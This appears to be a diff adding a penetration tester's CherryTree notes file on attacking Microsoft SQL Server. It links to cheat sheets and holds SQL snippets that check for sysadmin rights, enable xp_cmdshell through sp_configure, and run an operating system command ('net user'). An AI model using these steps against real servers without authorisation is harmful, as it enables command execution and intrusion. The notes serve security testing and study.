@@ -1,0 +1,48 @@
+<?xml version="1.0" encoding="UTF-8"?>
+<cherrytree>
+  <node unique_id="35" master_id="0" name="MSSQL CLIENT" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1730894800" ts_lastsave="1730894868">
+    <rich_text link="webs https://pentestmonkey.net/cheat-sheet/sql-injection/mssql-sql-injection-cheat-sheet">https://pentestmonkey.net/cheat-sheet/sql-injection/mssql-sql-injection-cheat-sheet</rich_text>
+    <rich_text>
+</rich_text>
+    <rich_text link="webs https://book.hacktricks.xyz/pentesting/pentesting-mssql-microsoft-sql-server">https://book.hacktricks.xyz/pentesting/pentesting-mssql-microsoft-sql-server</rich_text>
+    <rich_text>
+
+
+To check if is admin
+
+
+Set up the command execution xp_cmdshell
+
+
+
+
+activation of xp_cmdshell as follows:
+
+
+
+
+</rich_text>
+    <rich_text link="webs https://pentestmonkey.net/cheat-sheet/sql-injection/mssql-sql-injection-cheat-sheet">https://pentestmonkey.net/cheat-sheet/sql-injection/mssql-sql-injection-cheat-sheet</rich_text>
+    <rich_text>
+</rich_text>
+    <rich_text link="webs https://book.hacktricks.xyz/network-services-pentesting/pentesting-mssql-microsoft-sql-server">https://book.hacktricks.xyz/network-services-pentesting/pentesting-mssql-microsoft-sql-server</rich_text>
+    <rich_text>
+
+</rich_text>
+    <codebox char_offset="184" justification="left" frame_width="500" frame_height="50" width_in_pixels="1" syntax_highlighting="plain-text" highlight_brackets="1" show_line_numbers="0">select is_srvrolemember('sysadmin');
+</codebox>
+    <codebox char_offset="229" justification="left" frame_width="624" frame_height="50" width_in_pixels="1" syntax_highlighting="plain-text" highlight_brackets="1" show_line_numbers="0">EXEC xp_cmdshell 'net user'; — privOn MSSQL 2005 you may need to reactivate xp_cmdshell
+first as it’s disabled by default:
+EXEC sp_configure 'show advanced options', 1; — priv
+RECONFIGURE; — priv
+EXEC sp_configure 'xp_cmdshell', 1; — priv
+RECONFIGURE; — priv
+</codebox>
+    <codebox char_offset="271" justification="left" frame_width="540" frame_height="50" width_in_pixels="1" syntax_highlighting="plain-text" highlight_brackets="1" show_line_numbers="0">
+EXEC sp_configure 'show advanced options', 1;
+RECONFIGURE;
+sp_configure; - Enabling the sp_configure as stated in the above error message
+EXEC sp_configure 'xp_cmdshell', 1;
+RECONFIGURE;</codebox>
+  </node>
+</cherrytree>
